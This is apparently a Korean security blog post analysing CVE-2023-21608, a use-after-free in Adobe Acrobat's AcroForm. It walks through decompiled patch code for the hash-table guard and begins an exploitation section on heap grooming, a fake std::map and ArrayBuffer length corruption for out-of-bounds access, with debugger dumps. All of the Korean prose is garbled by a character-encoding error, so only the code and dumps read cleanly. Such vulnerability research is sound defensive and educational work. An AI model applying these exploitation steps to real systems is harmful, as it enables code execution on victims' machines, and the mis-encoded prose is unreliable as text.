 ë²„í‚·ì´ ë¹„ì–´ìˆëŠ” ê²½ìš°ë‚˜ ë²„í‚·ì— í•´ë‹¹í•˜ëŠ” ë°ì´í„°ê°€ ì—†ëŠ” ê²½ìš°, `returnPtr->Flink`ì™€ `returnPtr->Blink`ì— ê°ê° `BucketHead`ì™€ `NULL`ì´ ì €ì¥ë˜ê³  ë°ì´í„°ë¥¼ ì°¾ì€ ê²½ìš°ì—ëŠ” í•´ë‹¹ ë°ì´í„°ë¥¼ ì €ì¥í•˜ê³  ìˆëŠ” ë…¸ë“œì˜ `Flink`ì™€ ë…¸ë“œì˜ ì£¼ì†Œê°€ ê°ê° `returnPtr->Flink`ì™€ `returnPtr->Blink`ì— ì €ì¥ë˜ì–´ ë°˜í™˜ë©ë‹ˆë‹¤.

`sub_20AD638B`ì—ì„œëŠ” `FindDataFromHashTable`ì—ì„œ íƒìƒ‰ ê²°ê³¼ê°€ ì €ì¥ë˜ê³  ë°˜í™˜ëœ `returnPtr`ì˜ `Blink`ë¥¼ ê²€ì‚¬í•˜ì—¬ ì´ ê°’ì´ `NULL`ì¸(HashTableì— í•´ë‹¹ ë°ì´í„°ê°€ ì¡´ì¬í•˜ì§€ ì•ŠëŠ”) ê²½ìš° ë‘ ë²ˆì§¸ ì¸ì `a2`ì˜ `Flink`ì— `hashTable->DefaultHead`ë¥¼ ì €ì¥í•˜ê³  ë°˜í™˜í•©ë‹ˆë‹¤.

```c
  v5 = FindDataFromHashTable(hashTable, &returnPtr, pData, DataHash)->Blink;
  if ( !v5 )
    v5 = hashTable->DefaultHead;
  result = a2;
  a2->Flink = v5;                              
  return result;
```

ìµœì¢…ì ìœ¼ë¡œ `IsDataInGlobalHashTable` ì—ì„œëŠ” ì•„ë˜ì™€ ê°™ì´ `GlobalHashTable`ì— `Data`ê°€ ì¡´ì¬í•˜ëŠ” ê²½ìš° ë°˜í™˜ë˜ëŠ” ë…¸ë“œì˜ ì£¼ì†Œë‚˜ ë°ì´í„°ê°€ ì—†ëŠ” ê²½ìš°ì— ë°˜í™˜ë˜ëŠ” `GlobalHashTable.DefaultHead`ë¥¼ `GlobalHashTable.DefaultHead`ì™€ ë¹„êµí•˜ê³  ì´ ê²°ê³¼ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.

```c
return Data && sub_20AD638B(&GlobalHashTable, (ListEntry *)&a2, (int)&Data)->Flink != GlobalHashTable.DefaultHead;
//if Data is in GlobalHashTable, then Node's Addr != GlobalHashTable.
//=> return true
//else return false
```

ë”°ë¼ì„œ `GetRichValueEventProp`ì—ì„œëŠ” ì•„ë˜ì™€ ê°™ì´ `PointerType`ì´ `GlobalHashTable`ì— ì¡´ì¬í•˜ì§€ ì•Šì„ ê²½ìš°ì—ë§Œ `CAggToESVal`ì´ í˜¸ì¶œë˜ëŠ” ë¶„ê¸°ë¡œ ì§„ì…í•˜ê²Œ ë©ë‹ˆë‹¤.

```c
      if ( PointerType )
      {
        LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
        if ( !(_BYTE)PointerType )
        {
          v15 = InsertToGlobalHashTable((int)&v31, PointerType_1);
          LOBYTE(v33) = 4;
          CAggToESVal((int)v15, v16, PropName, PointerType_1);
          PointerType = DeleteFromGlobalHashTable((int)&v31);
        }
      }
```

ì•„ë˜ëŠ” `CAggToESVal` ì´ì „ì— í˜¸ì¶œë˜ëŠ” `InsertToGlobalHashTable`í•¨ìˆ˜ì˜ ë¶„ì„ì…ë‹ˆë‹¤.

## InsertToGlobalHashTable

```c
_DWORD *__thiscall InsertToGlobalHashTable(int a1, int Data)
{
  int v4[2]; // [esp+4h] [ebp-8h] BYREF

  if ( Data )
  {
    InsertIfNotPresent(&GlobalHashTable, (ListEntry *)v4, (int)&Data)->Flink->field_C = 1;
    *(_DWORD *)a1 = Data;
  }
  return (_DWORD *)a1;
}
```

`GlobalHashTable`ê³¼ í•´ì‹œ í…Œì´ë¸”ì— ì¶”ê°€í•  ë°ì´í„°ì˜ ì£¼ì†Œë¥¼ ì¸ìë¡œ `InsertIfNotPresent`í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. í˜¸ì¶œëœ í•¨ìˆ˜ê°€ ë°˜í™˜ë˜ë©´ ì²« ë²ˆì§¸ ì¸ì `a1`ì´ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì— `Data`ë¥¼ ì“°ê³  ë°˜í™˜í•©ë‹ˆë‹¤.

### InsertIfNotPresent

```c
ListEntry *__thiscall InsertIfNotPresent(HashTable *hashTable, ListEntry *a2, int *pData)
{
  int DataHash; // ebx
  ListEntry *result; // eax
  HashBucketEntry *newBucketEntry; // edi
  HashBucketEntry *BucketHead; // ecx
  HashBucketEntry *v8; // eax
  bool v9; // zf
  ListEntry findResult; // [esp+10h] [ebp-24h] BYREF
  HashBucketEntry v11; // [esp+18h] [ebp-1Ch] BYREF
  int v12; // [esp+30h] [ebp-4h]

  DataHash = hashFunction(0x811C9DC5, pData, 4u);
  FindDataFromHashTable(hashTable, &findResult, pData, DataHash);
  if ( findResult.Blink )                       // Data is present in HashTable, no insertion
  {
    result = a2;
    a2->Flink = findResult.Blink;
    LOBYTE(a2->Blink) = 0;
  }
  else                                          // Data is not present -> insertion occurs
  {
    hashTableLengthCheck(hashTable);
    v11.Data = (int)pData;
    AllocateNewNode(&v11, (HashBucketEntry *)&hashTable->DefaultHead, &dword_2100AE5C, (int)&v11.Data);// allocate new node
                                                // v11.list_entry.list_entry.blink = new_node
    v12 = 0;
    if ( IsBucketExpandNeeded(hashTable) )
    {
      expandHashTable(hashTable);
      newBucketEntry = v11.list_entry.list_entry.Blink;
      BucketHead = FindDataFromHashTable(hashTable, &findResult, &v11.list_entry.list_entry.Blink->Data, DataHash)->Flink;
    }
    else
    {
      BucketHead = findResult.Flink;
      newBucketEntry = v11.list_entry.list_entry.Blink;
    }
    v11.list_entry.list_entry.Blink = 0;
    v8 = InsertIntoHashTable(hashTable, DataHash, BucketHead, newBucketEntry);
    v9 = v11.list_entry.list_entry.Blink == 0;
    a2->Flink = v8;
    LOBYTE(a2->Blink) = 1;
    if ( !v9 )
      sub_20867B89(v11.list_entry.list_entry.Blink);
    result = a2;
  }
  return result;
}
```

ì´ í•¨ìˆ˜ì—ì„œëŠ” `hashFunction`ê³¼ `FindDataFromHashTable`ë¡œ ë¨¼ì € ì‚½ì…í•  ë°ì´í„°ê°€ í•´ì‹œ í…Œì´ë¸”ì— ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ê²½ìš° `findResult.Blink`ê°€ `NULL`ì´ ì•„ë‹Œ ê°’ìœ¼ë¡œ ì„¤ì •ë˜ê¸°ì— `if`ë¡œ ë¶„ê¸°í•˜ì—¬ ì‚½ì… ê³¼ì • ì—†ì´ í•¨ìˆ˜ê°€ ë°˜í™˜ë˜ê³  í•´ì‹œ í…Œì´ë¸”ì— ì‚½ì…í•  ë°ì´í„°ê°€ ì—†ëŠ” ê²½ìš° `else`ë¡œ ë¶„ê¸°í•˜ì—¬ ë°ì´í„°ì˜ ì‚½ì…ì´ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤.

`else` ë¶„ê¸°ì—ì„œëŠ” `AllocateNewNode`í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ì–´ `Data`ì— `*pData`ê°€ ì €ì¥ëœ ìƒˆë¡œìš´ ë…¸ë“œê°€ í• ë‹¹ë˜ê³  `findResult.Flink`ê°€ ê°€ë¦¬í‚¤ëŠ” ë°ì´í„°ê°€ ì‚½ì…ë  ë²„í‚·ì˜ `Head`ì£¼ì†Œì™€ í• ë‹¹ëœ ë…¸ë“œë¥¼ ì¸ìë¡œ `InsertIntoHashTable` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

### InsertIntoHashTable

`InsertIntoHashTable` í•¨ìˆ˜ì—ì„œëŠ” ì•„ë˜ì™€ ê°™ì´ `target->Blink`ì— `newNode`ë¥¼ ì‚½ì…í•˜ëŠ” ë™ì‘ì„ í•©ë‹ˆë‹¤.

```c
HashBucketEntry *__thiscall InsertIntoHashTable(HashTable *hashTable, int DataHash, HashBucketEntry *target, HashBucketEntry *newNode)
{
  HashBucketEntry *tmp; // ebx
  int idx; // edx
  HashBucketEntryHeader *v6; // esi
  HashBucketEntry *result; // eax

  tmp = target->list_entry.list_entry.Blink;
  ++hashTable->length;                          // Increase Length
  newNode->list_entry.list_entry.Flink = target;
  newNode->list_entry.list_entry.Blink = tmp;
  tmp->list_entry.list_entry.Flink = newNode;
  target->list_entry.list_entry.Blink = newNode;// 
  // Blink: <-
  // Flink: ->
  // 
  // Before Insertion
  // 
  // ... <-> tmp <-> target <-> ...
  // 
  // After Insertion
  //  
  //  ... <-> tmp <-> newNode <-> target <-> ...
  idx = DataHash & hashTable->HashBuckets.BucketMaxIndex;
  v6 = hashTable->HashBuckets.HashBucketBegin;
  result = newNode;
  if ( v6[idx].BucketHead == hashTable->DefaultHead )
  {
    v6[idx].BucketHead = newNode;
LABEL_6:
    v6[idx].BucketTail = newNode;
    return result;
  }
  if ( v6[idx].BucketHead == target )
  {
    v6[idx].BucketHead = newNode;
    return result;
  }
  if ( v6[idx].BucketTail == tmp )
    goto LABEL_6;
  return result;
}
```

ì´í›„ ì‚½ì…ìœ¼ë¡œ ì¸í•´ ë²„í‚·ì˜  Headë‚˜ Tailì´ ë°”ë€ ê²½ìš°, í•´ë‹¹í•˜ëŠ” `HashBucketEntryHeader`ì˜ `BucketHead`ë‚˜ `BucketTail`ì„ ë³€ê²½í•©ë‹ˆë‹¤.

ìœ„ ê³¼ì •ì„ í†µí•´ í•´ì‹œ í…Œì´ë¸”ì— `PointerType`ì˜ ì‚½ì…ì´ ì´ë£¨ì–´ì§„ ë‹¤ìŒ `CAggToESVal`í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ê³  ì´í›„ ì•„ë˜ì˜ `DeleteFromGlobalHashTable` í•¨ìˆ˜ê°€ í˜¸ì¶œë©ë‹ˆë‹¤.

## DeleteGlobalFromHashTable

```c
int __thiscall DeleteFromGlobalHashTable(_DWORD *pData)
{
  int result; // eax

  if ( *pData )                                 
  {
    result = DeleteFromHashTable(&GlobalHashTable, pData);
    *pData = 0;
  }
  return result;
}
```

`GlobalHashTable`ê³¼ `pData`ë¥¼ ì¸ìë¡œ `DeleteFromHashTable`ì„ í˜¸ì¶œí•©ë‹ˆë‹¤

### DeleteFromHashTable

```c
int __thiscall DeleteFromHashTable(HashTable *hashTable, _DWORD *pData)
{
  int DataHash; // ebx
  HashBucketEntry *v4; // edi
  ListEntry result; // [esp+Ch] [ebp-8h] BYREF

  DataHash = hashFunction(0x811C9DC5, pData, 4u);
  v4 = FindDataFromHashTable(hashTable, &result, pData, DataHash)->Blink;
  if ( !v4 )
    return 0;                                   // Not Found, No deletion
  UnlinkTargetFromBucketEntryHeader(hashTable, v4, DataHash & hashTable->HashBuckets.BucketMaxIndex);
  UnlinkSelf((int *)&hashTable->DefaultHead, v4);
  return 1;
}
```

í˜¸ì¶œëœ `DeleteFromHashTable`í•¨ìˆ˜ì—ì„œëŠ” `hashFunction`ê³¼ `FindDataFromHashTable` í•¨ìˆ˜ í˜¸ì¶œì„ í†µí•´ í•´ì‹œ í…Œì´ë¸”ì—ì„œ ì œê±°í•˜ê³ ì í•˜ëŠ” ë°ì´í„°ê°€ í•´ì‹œ í…Œì´ë¸”ì— ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì¡´ì¬í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ ë‹¤ë¥¸ ë™ì‘ì„ ìˆ˜í–‰í•˜ì§€ ì•Šê³  ë°˜í™˜í•©ë‹ˆë‹¤.

ì œê±°í•  ë°ì´í„°ê°€ í•´ì‹œ í…Œì´ë¸”ì— ì¡´ì¬í•œë‹¤ë©´ ë¨¼ì € ì•„ë˜ì˜ `UnlinkTargetFromBucketEntryHeader` í•¨ìˆ˜ê°€ í˜¸ì¶œë©ë‹ˆë‹¤.

### UnlinkTargetFromBucketEntryHeader

```c
HashBucketEntry *__thiscall UnlinkTargetFromBucketEntryHeader(HashTable *hashTable, HashBucketEntry *target, int Idx)
{
  HashBucketEntryHeader *v3; // edx
  HashBucketEntry *result; // eax

  v3 = hashTable->HashBuckets.HashBucketBegin;
  result = target;
  if ( v3[Idx].BucketTail == target )           
  {
    if ( v3[Idx].BucketHead == target )        
    {
      result = hashTable->DefaultHead;
      v3[Idx].BucketHead = result;
    }
    else
    {
      result = target->list_entry.list_entry.Blink;
    }
    v3[Idx].BucketTail = result;
  }
  else if ( v3[Idx].BucketHead == target )
  {
    result = target->list_entry.list_entry.Flink;
    v3[Idx].BucketHead = target->list_entry.list_entry.Flink;
  }
  return result;
}
```

ì´ í•¨ìˆ˜ì—ì„œëŠ” `BucketHead`ì™€ `BucketTail`ê°€ ì œê±°í•˜ê³ ì í•˜ëŠ” ë…¸ë“œì¸ `target`ê³¼ ê°™ì€ì§€ ê²€ì‚¬í•˜ì—¬ Headë‚˜ Tail í˜¹ì€ ì–‘ìª½ ëª¨ë‘ë¥¼ ê°±ì‹ í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ `target`ì´ `BucketHead`ì¸ ê²½ìš°ì—ëŠ” `target->Flink`ë¥¼ ìƒˆë¡œìš´ Headë¡œ ê°±ì‹ í•˜ê³  `BucketTail`ì¸ ê²½ìš°ì—ëŠ” `target->Blink`ë¥¼ ìƒˆë¡œìš´ Tailë¡œ ê°±ì‹ í•©ë‹ˆë‹¤. `target`ì´ ë²„í‚·ì— ì¡´ì¬í•˜ëŠ” ìœ ì¼í•œ ë…¸ë“œë¼ë©´ `BucketHead`ì™€ `BucketTail`ì„ ëª¨ë‘ `hashTable->DefaultHead`ë¡œ ë³€ê²½í•˜ì—¬ ë²„í‚·ì´ ë¹„ì—ˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

`DeleteFromHashTable`ì—ì„œ ì´ í•¨ìˆ˜ê°€ ë°˜í™˜í•œ ë‹¤ìŒ í˜¸ì¶œë˜ëŠ” ê²ƒì€ ì•„ë˜ì˜ `UnlinkSelf` í•¨ìˆ˜ì…ë‹ˆë‹¤

### UnlinkSelf

```c
int __thiscall UnlinkSelf(int *a1, HashBucketEntry *target)
{
  HashBucketEntry *v2; // esi

  v2 = target->list_entry.list_entry.Flink;
  --a1[1];                                      // decrease length
  target->list_entry.list_entry.Blink->list_entry.list_entry.Flink = v2;// Unlink
  v2->list_entry.list_entry.Blink = target->list_entry.list_entry.Blink;
  sub_20867B89(target);                         // free
  return (int)v2;
}
```

ì²« ë²ˆì§¸ ì¸ì `a1`ìœ¼ë¡œ ì „ë‹¬ëœ `GlobalHashTable.DefaultHead`ì˜ ì£¼ì†Œì— 4ë¥¼ ë”í•œ ì£¼ì†Œì— ìœ„ì¹˜í•œ `length`ë¥¼ 1 ê°ì†Œì‹œí‚¤ê³  ì œê±°í•˜ê³ ì í•˜ëŠ” ë…¸ë“œì¸ `target`ì„ ì—°ê²° ë¦¬ìŠ¤íŠ¸ì—ì„œ ì œê±°í•©ë‹ˆë‹¤. ì´í›„ í˜¸ì¶œë˜ëŠ” `sub_20867B89`ì—ì„œëŠ” `target`ì´ ê°€ë¦¬í‚¤ëŠ” ë©”ëª¨ë¦¬ì˜ í•´ì œê°€ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤.

## Patched : SetRichValueEventProp & GetRichValueEventProp

`IsDataInGlobalHashTable`, `InsertToGlobalHashTable`, `DeleteFromGlobalHashTable`í•¨ìˆ˜ì˜ í˜¸ì¶œì€ ì•„ë˜ì™€ ê°™ì´ `SetRichValueEventProp` í•¨ìˆ˜ì—ë„ `GetRichValueEventProp`ê³¼ ìœ ì‚¬í•œ ë°©ì‹ìœ¼ë¡œ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¼ ì´ì œ ì´ëŸ¬í•œ ì½”ë“œë“¤ì´ ì¶”ê°€ë¨ìœ¼ë¡œì¨ ì–´ë–»ê²Œ ì·¨ì•½ì ì´ ë°œìƒí•˜ì§€ ì•Šê²Œ ë˜ëŠ”ì§€ ì•Œì•„ë´…ì‹œë‹¤!

```c
int __cdecl SetRichValueEventProp(wchar_t *a1, int a2, int a3)
{
  ...
  if ( v7() )
  {
    ...
    if ( !v8() )
    {
      ...
      if ( (_WORD)v34 == v16()
        || (v29 = 0,
            v28 = (int)"bWillCommit",
            v27 = v4,
            v17 = *(int (**)(void))(dword_2147CFA0 + 196),
            __guard_check_icall_fptr(v4, "bWillCommit"),
            v18 = v17(),
            (_WORD)v18) )
      {
LABEL_12:
        v29 = "CAgg_P";
        v18 = sub_20A4BC05(v4, (wchar_t *)"richValue");
        PointerType = (_DWORD *)v18;
        if ( v18 )
        {
          LOBYTE(v18) = IsDataInGlobalHashTable(v18);
          if ( !(_BYTE)v18 )                    // Not in process
          {
            v21 = InsertToGlobalHashTable((int)&PointerTypePtr, (int)PointerType);
            LOBYTE(v36) = 1;
            CAgg::Convert((int)v21, v22, PointerType, 0);
            sub_20AD749C((int)PointerType, v33, 0);// GetRichValueEventProp called
            v23 = *(void (**)(void))(dword_2147CFA0 + 200);
            v29 = (const wchar_t *)1;
            __guard_check_icall_fptr(v4, "bModified");
            v23();
            v18 = DeleteFromGlobalHashTable((int)&PointerTypePtr);
          }
        }
      }
      sub_20AAE6F7(v18, v19, v35);
    }
    result = 1;
  }
  else
  {
    ...
  }
  return result;
}
```

ì·¨ì•½í•œ ë²„ì „ì—ì„œ ë²„ê·¸ê°€ íŠ¸ë¦¬ê±°ë˜ëŠ” ê³¼ì •ì´ íŒ¨ì¹˜ëœ ë²„ì „ì— ë™ì¼í•˜ê²Œ ì ìš©ë  ê²½ìš°, ë¨¼ì € `SetRichValueEventProp`ì—ì„œ í˜¸ì¶œëœ `IsDataInGlobalHashTable`ì˜ ë°˜í™˜ ê°’ì´ 0ì¸ ê²½ìš° `InsertToGlobalHashTable` í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ì–´ `PointerType`ì´ í•´ì‹œ í…Œì´ë¸”ì— ì¶”ê°€ë  ê²ƒì´ê³  ì´í›„ í˜¸ì¶œë˜ëŠ” `sub_20AD749C`í•¨ìˆ˜ë¡œ ì¸í•´ `GetRichValueEventProp` í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ê³  ì•„ë˜ì˜ ì½”ë“œê°€ ì‹¤í–‰ë˜ë©´ì„œ `IsDataInGlobalHashTable`í•¨ìˆ˜ê°€ í˜¸ì¶œë©ë‹ˆë‹¤.

```c
int __cdecl GetRichValueEventProp(wchar_t *a1, int a2, int a3)
{
  ...
  if ( v5() )
  {
    ...
  }
  else
  {
    ...
    if ( v31
      && (v23 = "richValue",
          v22 = (int)v31,
          v11 = *(unsigned __int16 (__fastcall **)(int))(dword_2147CFA0 + 180),
          v12 = __guard_check_icall_fptr(v31, "richValue"),
          v11(v12)) )
    {
      v23 = "CAgg_P";
      PointerType = sub_20A4BC05(v31, (wchar_t *)"richValue");
      PointerType_1 = PointerType;
      if ( PointerType )
      {
        LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
        if ( !(_BYTE)PointerType )
        {
          v15 = InsertToGlobalHashTable((int)&v31, PointerType_1);
          LOBYTE(v33) = 4;
          CAggToESVal((int)v15, v16, PropName, PointerType_1);
          PointerType = DeleteFromGlobalHashTable((int)&v31);
        }
      }
    }
    ...
  }
  return result;
}
```

ì·¨ì•½í•œ ë²„ì „ì—ì„œëŠ” ì•„ë¬´ëŸ° ê²€ì¦ ì—†ì´ `CAggToESVal`ì´ í˜¸ì¶œë˜ì–´ ì—´ê±° ë„ì¤‘ì— ì˜¤ë¸Œì íŠ¸ë“¤ì´ í•´ì œë˜ê³  ì´í›„ Use-After-Freeê°€ ë°œìƒí•˜ê²Œ ë˜ì§€ë§Œ íŒ¨ì¹˜ëœ ë²„ì „ì—ì„œëŠ” `CAggToESVal`ì„ í˜¸ì¶œí•˜ê¸° ì „ì— `IsDataInGlobalHashTable` í•¨ìˆ˜ê°€ í˜¸ì¶œë©ë‹ˆë‹¤. ì´ë•Œì˜ `PointerType`ì€ `SetRichValueEventProp`ì˜ `PointerType`ê³¼ ê°™ê³  `SetRichValueEventProp`ì—ì„œ í˜¸ì¶œëœ `InsertToGlobalHashTable` í•¨ìˆ˜ì— ì˜í•´ ì´ë¯¸ í•´ì‹œ í…Œì´ë¸”ì— ì¡´ì¬í•˜ëŠ” ìƒíƒœì…ë‹ˆë‹¤.

ë”°ë¼ì„œ `GetRichValueEventProp`ì—ì„œ í˜¸ì¶œëœ `IsDataInGlobalHashTable`ì€ `true`ë¥¼ ë°˜í™˜í•˜ê²Œ ë˜ê³  `CAggToESVal`ì´ í˜¸ì¶œë˜ì§€ ì•Šì•„ ë²„ê·¸ê°€ ë°œìƒí•˜ì§€ ì•Šê²Œ ë©ë‹ˆë‹¤.

ë˜í•œ `richValue`ì™€ ë™ì¼í•œ ë°©ì‹ìœ¼ë¡œ ë²„ê·¸ë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆëŠ” `richChange`ì™€ ê´€ë ¨ëœ `SetRichChangeEventProp`í•¨ìˆ˜ì™€ `GetRichChangeEventProp`í•¨ìˆ˜ë„ ê°™ì€ ë°©ì‹ìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.

# 4. Exploitation

---

ê·¸ëŸ¼ ì´ì œ ëŒ€ë§ì˜ ìµìŠ¤í”Œë¡œì‡ë§Œì´ ë‚¨ì•˜ìŠµë‹ˆë‹¤. ìœ„ì—ì„œ ì–˜ê¸°í•œ ê²ƒì²˜ëŸ¼ ìµìŠ¤í”Œë¡œì‡ì—ì„œë„ ìë°”ìŠ¤í¬ë¦½íŠ¸ê°€ ì‚¬ìš©ë˜ê³  ì´ì „ê¹Œì§€ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ ìµìŠ¤í”Œë¡œì‡ ê²½í—˜ì´ ì—†ì—ˆê¸°ì— êµ‰ì¥íˆ ì‹ ì„ í•˜ê²Œ ëŠê»´ì§€ê¸°ë„ í–ˆìŠµë‹ˆë‹¤.

![Untitled](1day1document_CVE-2023-21608/Untitled%205.png)

> ~~ê·¸ë˜ë„ ë‚œ íŒŒì´ì¬ì´ ì¢‹ì•„~~
> 

RCE ìµìŠ¤í”Œë¡œì‡ì„ ìœ„í•´ ë¨¼ì € í™ ê·¸ë£¨ë°ì„ í†µí•´ Use-After-Freeê°€ ë°œìƒí•˜ëŠ” ë©”ëª¨ë¦¬ì— ê³µê²©ìê°€ ì¡°ì‘í•  ìˆ˜ ìˆëŠ” ë°ì´í„°ë¥¼ í• ë‹¹í•˜ê³  ì´ë¥¼ í†µí•´ ë²„ê·¸ê°€ ë°œìƒí•  ë•Œ ë©”ëª¨ë¦¬ì— í• ë‹¹ëœ íŠ¹ì • `ArrayBuffer`ì˜ lengthê°€ ë®ì–´ ì“°ì´ê²Œ ë§Œë“¤ì–´ ì´ë¥¼ OOB Read/Writeì— ì‚¬ìš©í•©ë‹ˆë‹¤.

## 1. Create Corrupted ArrayBuffer

ì•„ë˜ëŠ” page-heapì´ í™œì„±í™”ëœ ìƒíƒœì—ì„œ í¬ë˜ì‹œê°€ ë°œìƒí•˜ëŠ” `CAgg::operator[]`í•¨ìˆ˜ì…ë‹ˆë‹¤.

### CAgg::operator[]

```c
int __userpurge CAgg::operator[]@<eax>(int *this@<ecx>, bool *a2@<ebx>, wchar_t *someID)
{
...
  if ( *this == 0x13 )                          // this->type
  {
    v6 = *(int (__fastcall **)(int))(dword_21473CA4 + 28);
    v7 = __guard_check_icall_fptr(someID);
    v8 = (void *)v6(v7);
    v15 = (wchar_t *)sub_20867317(v8, 1);
    v9 = (int *)this[2];
    v16 = 0;
    v11 = *(_DWORD *)sub_20AA6EED((int)a2a, v10, v9, (int)&v15, (int)a2a);
    v16 = 1;
    if ( v15 )
      sub_208679A2(v15);
    result = v11 + 24;
  }
  else
  {
    if ( *this == 0x14 )
    {
      v4 = (_DWORD *)std::map<unsigned short,CAgg>::operator[](this[2], (int)v14, v12);
    }
    else
    {
      CAgg::Convert((int)this, (_DWORD *)0x14);
      v4 = (_DWORD *)std::map<unsigned short,CAgg>::operator[](this[2], (int)a2a, &someID);// this->map
    }
    result = *v4 + 24;
  }
  return result;
}
```

í™ ê·¸ë£¨ë°ì´ ì„±ê³µì ìœ¼ë¡œ ì´ë£¨ì–´ì§„ ìƒíƒœì—ì„œëŠ” `EScript_ESObjectEnum_CallbackProc`ì—ì„œ ì•„ë˜ì²˜ëŸ¼ ê³µê²©ìì— ì˜í•´ ì»¨íŠ¸ë¡¤ë˜ëŠ” ë©”ëª¨ë¦¬ë¥¼ ì‚¬ìš©í•´ì„œ `CAgg::operator[]`í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. 

```
eax=00001b36 ebx=00000000 ecx=2909d478 edx=10e60da0 esi=71eaef50 edi=2909d478
eip=63ac2a4b esp=0457ac14 ebp=0457ac28 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
AcroForm!DllUnregisterServer+0x69eb:
63ac2a4b e83b410000      call    AcroForm!DllUnregisterServer+0xab2b (63ac6b8b)
0:000> dd ecx // ecx+8 == this->map
2909d478  4e4e4d4d 50504f4f *20000058* 54545353
2909d488  56565555 58585757 5a5a5959 5c5c5b5b
2909d498  5e5e5d5d 60605f5f 00006161 00000000
2909d4a8  b0fe1536 8c002000 42424141 44444343
2909d4b8  46464545 48484747 4a4a4949 4c4c4b4b
2909d4c8  4e4e4d4d 50504f4f 20000058 54545353
2909d4d8  56565555 58585757 5a5a5959 5c5c5b5b
2909d4e8  5e5e5d5d 60605f5f 00006161 00000000
```

 `std::map<unsigned short,CAgg>::operator[]`í˜¸ì¶œì— ì‚¬ìš©ë˜ëŠ” `this->map`ì€ í™ ìŠ¤í”„ë ˆì´ë¥¼ í†µí•´ 0x20000048ì— í• ë‹¹ëœ ì•„ë˜ì˜ `ArrayBuffer`ë¥¼ ê°€ë¦¬í‚¤ê³  ìˆê³   0x20000048ì— 0x10 ë°”ì´íŠ¸ì˜ í—¤ë”ê°€ ìœ„ì¹˜í•´ìˆìœ¼ë©° 0x20000058ë¶€í„° ë°ì´í„°ê°€ ìœ„ì¹˜í•˜ê³  ì´ëŠ” ê³µê²©ìì— ì˜í•´ ì‚¬ì „ì— êµ¬ì„±ë˜ì—ˆìŠµë‹ˆë‹¤.

```
0:000> dd 0x20000048
20000048  00000000 0000ffe8 17c7bbe0 00000000
20000058  20000060 41424345 41424344 20000044 // 20000058 : this->map
20000068  33333333 33333333 33333333 33333333
20000078  33333333 33333333 00000000 00000000
```

ìœ„ ë°ì´í„° ì¤‘ `ArrayBuffer`ì˜ ê¸¸ì´ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ë¶€ë¶„ì€ ì˜¤í”„ì…‹ + 0x4ì¸ 0x2000004cë¡œ `std::map<unsigned short,CAgg>::operator[]`ì—ì„œ 0x20000058ì— êµ¬ì„±ëœ fake `map`ì„ ì‚¬ìš©í•˜ì—¬ í˜¸ì¶œë˜ëŠ” `lower_bound`ì™€ `insert`ì— ì˜í•´ ë³€ì¡°ë©ë‹ˆë‹¤.

### std::map<unsigned short,CAgg>::operator[]

```c
int __thiscall std::map<unsigned short,CAgg>::operator[](TREE_VAL *this, int a2, unsigned __int16 *pSomeID)
{
	...
	int v8[3]
  ...
  std::map<unsigned short,CAgg>::lower_bound(this, v8, pSomeID);
  v4 = v9;
  if ( sub_208E95F2(v9, pSomeID) )
  {
    ...
  }
  else
  {
    if ( this->_Mysize == 0x38E38E3 )
      Throw_tree_length_error();
    ...
    *(_DWORD *)a2 = std::map<unsigned short,CAgg>::insert(this, v8[0], (int)v8[1], Parent);
    ...
  }
  return result;
}
```

ë¨¼ì € í˜¸ì¶œë˜ëŠ” `lower_bound`ì—ì„œ ì•„ë˜ì˜ ì½”ë“œê°€ ì‹¤í–‰ë˜ì–´ ë‘ ë²ˆì§¸ ì¸ì(`a2`)ë¡œ ì „ë‹¬í•œ `v8`ì— ë°ì´í„°ë¥¼ ì”ë‹ˆë‹¤.

### std::map<unsigned short,CAgg>::lower_bound

```c
_DWORD *__thiscall std::map<unsigned short,CAgg>::lower_bound(int this, int *a2, int *a3)
{
  int Myhead; // eax
  int Parent; // ecx
  unsigned __int16 v5; // si
  int v6; // eax
                                                // TREE_VAL *this
  Myhead = *(_DWORD *)this;                     // this->_Myhead;
  //    mov     eax,dword ptr [ecx]  ds:002b:20000058=20000060
  Parent = *(_DWORD *)(*(_DWORD *)this + 4);    // this->_Myhead->_Parent
  //    mov     ecx,dword ptr [eax+4] ds:002b:20000064=20000044
  a2[1] = 0;
  *a2 = Parent;
  a2[2] = Myhead;
  ...
  return a2;                                    
}
```

